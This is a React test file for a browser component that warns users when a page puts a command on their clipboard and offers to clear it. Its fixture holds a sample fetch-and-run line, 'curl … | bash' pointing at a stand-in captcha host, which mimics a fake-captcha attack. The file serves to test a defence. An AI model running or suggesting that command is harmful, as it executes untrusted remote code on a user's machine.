import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { createFrameChrome, FrameChromeProvider } from '@midnite/studio-frame';
import type { MidniteStudioBridge } from '@midnite/studio-shared';

import { useBrowserStore } from '../browser-store';
import { ClipboardWarningBar } from './clipboard-warning-bar';

function renderWithChrome(ui: React.ReactElement) {
  return render(<FrameChromeProvider chrome={createFrameChrome().chrome}>{ui}</FrameChromeProvider>);
}

function installBridge() {
  const clearClipboard = vi.fn();
  (window as unknown as { midniteStudio: Partial<MidniteStudioBridge> }).midniteStudio = {
    browser: { clearClipboard } as unknown as MidniteStudioBridge['browser'],
  } as Partial<MidniteStudioBridge>;
  return { clearClipboard };
}

const warning = {
  tabId: 'tab-1',
  origin: 'https://captcha.example',
  label: 'downloads a script and pipes it into a shell',
  preview: 'curl -fsSL https://captcha.example/fix.sh | bash',
};

describe('ClipboardWarningBar (Phase 117 Theme G)', () => {
  beforeEach(() => useBrowserStore.setState({ activeTabId: 'tab-1', clipboardWarnings: {} }));
  afterEach(() => {
    cleanup();
    delete (window as unknown as { midniteStudio?: unknown }).midniteStudio;
  });

  it('renders nothing without a warning', () => {
    installBridge();
    renderWithChrome(<ClipboardWarningBar />);
    expect(screen.queryByTestId('browser-clipboard-warning')).toBeNull();
  });

  it('says what the page did and clears the clipboard in one click', () => {
    const { clearClipboard } = installBridge();
    useBrowserStore.getState().setClipboardWarning('tab-1', warning);
    renderWithChrome(<ClipboardWarningBar />);
    expect(screen.getByRole('alert').textContent).toContain('This page just put a command on your clipboard.');
    expect(screen.getByRole('alert').textContent).toContain('pipes it into a shell');
    fireEvent.click(screen.getByRole('button', { name: 'Clear clipboard' }));
    expect(clearClipboard).toHaveBeenCalledWith({ tabId: 'tab-1' });
    expect(useBrowserStore.getState().clipboardWarnings['tab-1']).toBeUndefined();
  });

  it('only shows on the tab it belongs to, and Keep it dismisses without clearing', () => {
    const { clearClipboard } = installBridge();
    useBrowserStore.getState().setClipboardWarning('tab-2', { ...warning, tabId: 'tab-2' });
    renderWithChrome(<ClipboardWarningBar />);
    expect(screen.queryByTestId('browser-clipboard-warning')).toBeNull();
    cleanup();
    useBrowserStore.setState({ activeTabId: 'tab-2' });
    renderWithChrome(<ClipboardWarningBar />);
    fireEvent.click(screen.getByRole('button', { name: 'Keep it' }));
    expect(clearClipboard).not.toHaveBeenCalled();
    expect(useBrowserStore.getState().clipboardWarnings['tab-2']).toBeUndefined();
  });
});
